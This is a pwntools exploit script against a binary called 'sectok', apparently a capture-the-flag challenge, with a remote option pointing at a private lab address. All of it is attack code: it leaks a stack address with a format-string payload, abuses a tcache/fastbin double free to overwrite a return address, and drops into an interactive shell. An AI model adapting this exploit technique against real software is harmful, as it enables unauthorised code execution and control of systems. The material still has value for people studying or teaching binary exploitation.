from pwn import *

elf#=context.binary=ELF('./sectok')

def start(argv=[],*a,**kw):
    if args.GDB:
        elf=context.binary=ELF('./sectok')
        return gdb.debug([elf.path]+argv,gdbscript=gdbscript,*a,**kw)
    elif args.REMOTE: # ('server', 'port')
        return remote("10.21.232.3","10101")
    else:
        elf=context.binary=ELF('./sectok')
        return process([elf.path]+argv,*a,**kw)

gdbscript='''
break main
b *0x0000000000400cea
b *0x0000000000400ceb
continue'''.format(**locals())

io=start()
def enterName(name):
    io.sendlineafter(b"What is your 4-letter name?",f"{name}".encode())

def gen(token: bytes):
    io.sendlineafter(b"Action:",f"g")
    io.sendlineafter(b"Enter the name for the token:",token)

def discard(id):
    io.sendlineafter(b"Action:",f"d")
    io.sendlineafter(b"Enter the index of the token:",f"{id}".encode())

def extract_string(input_string):
    # Define the regular expression pattern to match the string inside single quotes
    pattern = r"'(.*?)'"

    # Use re.findall to find all occurrences of the pattern in the input string
    matches = re.findall(pattern, input_string)

    # Return the matched strings
    return matches[0]

enterName(b"%"+str(10).encode()+b"$llp")
stack_address=io.recvline().strip()
stack_address=extract_string(stack_address.decode())


#add 7 tcachebins and 2 fastbins
for i in range(0,9):#0 to 8
    gen(b"ABCD")

#remove 7 tcachebins
for i in range(0,7):#0 to 6
    discard(i)

#double free vuln
discard(7)
discard(8)
discard(7)

#again add 7 tcachebins to reach the fastbins
for i in range(0,7):#0 to 6
    gen(b"ABCD")

#ret_addr=0x7fffffffd938#for arch gdb
#ret_addr=0x7fffffffd958
ret_addr=int(stack_address, 16)+0x8
#ret_addr=0x400dfa#an intentional wrong ret address
binsh_addr=0x400dfa

#gen(pack(ret_addr))#both works
gen(p64(ret_addr))#both works

gen("AAAA")
gen("BBBB")
#gen(struct.pack("<Q", ret_addr))
#gen(pack(elf.sym.binsh))
gen(p64(binsh_addr))
io.sendlineafter(b"Action:",f"x")

io.interactive()
